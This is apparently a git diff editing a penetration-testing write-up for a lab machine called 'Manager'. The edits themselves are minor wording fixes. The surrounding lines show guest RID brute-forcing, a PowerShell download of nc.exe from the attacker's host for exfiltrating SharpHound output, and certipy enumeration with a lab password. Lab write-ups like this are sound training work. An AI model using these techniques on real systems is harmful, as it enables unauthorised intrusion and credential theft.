@@ -46,6 +46,7 @@ PORT      STATE SERVICE
 ```
 
 - Let’s move on to service enumeration and run the default NSE scripts.
+- Basically, the below shell command retrieves the open ports from the previous nmap scan and puts them on the same line separated by commas, so I can easily copy-paste them into the second nmap scan where I run the default NSE scripts and perform service enumeration.
 
 ```shell
 grep -oP '^\d+/tcp' Manager_ports | cut -d/ -f1 | paste -sd, - 
@@ -208,7 +209,7 @@ nxc smb $IP -u 'guest' -p '' --rid > output.txt #We can bruteforce by rid
 
 ![](Images/guest%20account%20enabled.png)
 
-- I used `awk` to parse `output.txt` and generate two distinct files: one containing `users.txt` and the other containing `groups.txt`.
+- I used `awk` to parse `output.txt` and generated two distinct files: one containing `users.txt` and the other containing `groups.txt`.
 
 ```shell
 awk '
@@ -375,7 +376,7 @@ icacls C:\Users\Raven
 
 ![](Images/windows%20acls.png)
 ## Shell as Administrator
-- Now that I am connected as `raven`, I will run SharpHound to determine whether this user has any interesting ACLs that can be abused. I will upload `SharpHound.exe` and anso `nc.exe` since this is how I usually transfer the SharpHound ZIP output from the Windows box back to my machine.
+- Now that I am connected as `raven`, I will run SharpHound to determine whether this user has any interesting ACLs that can be abused. I will upload `SharpHound.exe` and also `nc.exe` since this is how I usually transfer the SharpHound ZIP output from the Windows box back to my machine.
 
 ```shell
 iwr -Uri "http://10.10.15.241/nc.exe" -Outfile nc.exe
@@ -408,7 +409,7 @@ Get-FileHash -Path "20260209134604_manager.zip"
 - Apparently, there is a CA in place and the user has the `ManageCA` right. He is also a member of the `Certificate Service DCOM Access` group. Next, I’ll run `certipy` to check for any vulnerable certificate templates and inspect the output.
 
 >[!Note]
->If a user is a member of `Certificate Service DCOM Access` `and nothing else`, they can precisely `connect to the Certificate Authority over DCOM/RPC` and perform `non-administrative` interactions with the CA, such as submitting certificate requests via RPC (instead of HTTP), querying CA properties and configuration (CA name, CA cert, enrollment endpoints, policies), checking the status of their own requests, and enumerating certain CA metadata; they `cannot` approve or deny requests, issue or revoke certificates, modify CA settings, manage templates, or affect other users’ certificates,
+>If a user is a member of `Certificate Service DCOM Access` `and nothing else`, they can precisely `connect to the Certificate Authority over DCOM/RPC` and perform `non-administrative` interactions with the CA, such as submitting certificate requests via RPC (instead of HTTP), querying CA properties and configuration (CA name, CA cert, enrollment endpoints, policies), checking the status of their own requests, and enumerating certain CA metadata; they `cannot` approve or deny requests, issue or revoke certificates, modify CA settings, manage templates, or affect other users’ certificates.
 
 ```shell
 certipy find -dc-ip $IP -u raven -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
